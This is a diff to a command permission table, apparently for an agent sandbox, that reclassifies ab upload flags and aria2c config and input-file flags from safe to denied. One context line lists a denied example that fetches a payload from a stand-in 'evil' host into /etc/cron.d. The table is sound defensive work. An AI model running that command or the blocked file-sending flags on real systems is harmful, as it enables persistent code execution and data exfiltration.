@@ -161,12 +161,12 @@ ab -k	safe-read
 ab -l x	safe-read
 ab -m x	safe-read
 ab -n x	safe-read
-ab -p x	safe-read
+ab -p x	denied
 ab -q	safe-read
 ab -r	safe-read
 ab -s x	safe-read
 ab -t x	safe-read
-ab -u x	safe-read
+ab -u x	denied
 ab -v	safe-read
 ab -w	safe-read
 ab -z x	safe-read
@@ -2447,8 +2447,8 @@ aria2c --check-integrity	safe-write
 aria2c --checksum	safe-write
 aria2c --checksum x	safe-write
 aria2c --conditional-get	safe-write
-aria2c --conf-path	safe-write
-aria2c --conf-path x	safe-write
+aria2c --conf-path	denied
+aria2c --conf-path x	denied
 aria2c --connect-timeout	safe-write
 aria2c --connect-timeout x	safe-write
 aria2c --console-log-level	safe-write
@@ -2513,8 +2513,8 @@ aria2c --https-proxy x	safe-write
 aria2c --human-readable	safe-write
 aria2c --index-out	safe-write
 aria2c --index-out x	safe-write
-aria2c --input-file	safe-write
-aria2c --input-file x	safe-write
+aria2c --input-file	denied
+aria2c --input-file x	denied
 aria2c --keep-unfinished-download-result	safe-write
 aria2c --listen-port	safe-write
 aria2c --listen-port x	safe-write
@@ -2653,8 +2653,8 @@ aria2c -d	safe-write
 aria2c -d x	safe-write
 aria2c -d/etc/cron.d -o job http://evil/payload	denied
 aria2c -h	safe-write
-aria2c -i	safe-write
-aria2c -i x	safe-write
+aria2c -i	denied
+aria2c -i x	denied
 aria2c -j	safe-write
 aria2c -j x	safe-write
 aria2c -l	safe-write
